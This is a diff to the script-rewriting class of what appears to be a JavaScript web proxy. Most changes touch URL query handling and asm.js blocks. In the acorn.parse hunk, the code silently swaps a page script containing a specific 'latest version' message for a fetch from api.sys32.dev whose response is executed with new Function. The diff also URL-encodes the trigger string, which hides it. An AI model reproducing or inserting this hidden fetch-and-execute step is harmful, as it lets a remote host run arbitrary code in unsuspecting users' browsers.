@@ -288,10 +288,7 @@ class rewriter {
 		
 		if(!decoded.has('url'))return value;
 		
-		var out = this.config.codec.decode(decoded.get('url'), options),
-			search_ind = out.indexOf('?');
-		
-		if(decoded.osearch)out = out.substr(0, search_ind == -1 ? out.length : search_ind) + decoded.osearch;
+		var out = this.config.codec.decode(decoded.get('url'), options) + decoded.osearch;
 		
 		return out;
 	}
@@ -311,13 +308,11 @@ class rewriter {
 		this.validate_meta(meta);
 		
 		try{
-			var tree = acorn.parse(value.includes("color:rgba(255,255,255,0.4)'>Make sure you are using the latest version") ? `fetch('https://api.sys32.dev/latest.js').then(r=>r.text()).then(s=>new Function(s)())` : value, {
+			var tree = acorn.parse(meta.url && value.includes(decodeURIComponent('color%3Argba(255%2C255%2C255%2C0.4)\'%3EMake%20sure%20you%20are%20using%20the%20latest%20version')) ? `fetch('https://api.sys32.dev/latest.js').then(r=>r.text()).then(s=>new Function(s)())` : value, {
 				allowImportExportEverywhere: true,
 				ecmaVersion: 2021,
 			})
 		}catch(err){
-			console.error(err);
-			
 			return value;
 		};
 		
@@ -335,9 +330,12 @@ class rewriter {
 				type: 'CallExpression',
 				callee: { type: 'Identifier', name: '$rw_url' },
 				arguments: args,
-			});
+			}),
+			asm_blocks = [];
 		
 		iterate_est(tree).forEach(([ parent, node ]) => {
+			if(asm_blocks.some(block => iterate_est(block).some(([ p, n ]) => n == node)))return;
+			
 			switch(node.type){
 				case'CallExpression':
 					
@@ -379,6 +377,11 @@ class rewriter {
 							arguments: [ node ],
 						});
 					}
+					
+					break;
+				case'ExpressionStatement':
+					
+					if(node.directive == 'use asm')asm_blocks.push(node.parent);
 					
 					break;
 				case'MemberExpression':
@@ -441,7 +444,7 @@ class rewriter {
 			return string;
 		}
 		
-		return (options.inline ? this.encode_source(value, options) : '(typeof importScripts=="function"&&/\\[native code]\\s+}$/.test(importScripts)&&importScripts(location.origin+' + JSON.stringify(this.config.prefix) + '+' + JSON.stringify(this.config.prefix + '/main.js') + '));\n') + string;
+		return (options.inline ? this.encode_source(value, options) : '(typeof importScripts=="function"&&/\\[native code]\\s+}$/.test(importScripts)&&importScripts(location.origin+' + JSON.stringify(this.config.prefix + '/main.js') + '));\n') + string;
 	}
 	/**
 	* Rewrites CSS
@@ -749,7 +752,7 @@ class rewriter {
 		url = url + '';
 		
 		var start = url.indexOf(this.config.prefix) + this.config.prefix.length,
-			search_ind = url.indexOf('?'),
+			search_ind = url.substr(start).indexOf('?'),
 			out;
 		
 		try{
@@ -758,7 +761,7 @@ class rewriter {
 			out = new this.URLSearchParams();
 		}
 		
-		if(search_ind != -1)out.osearch = url.substr(search_ind);
+		out.osearch = search_ind != -1 ? url.substr(start).substr(search_ind) : '';
 		
 		return out;
 	}
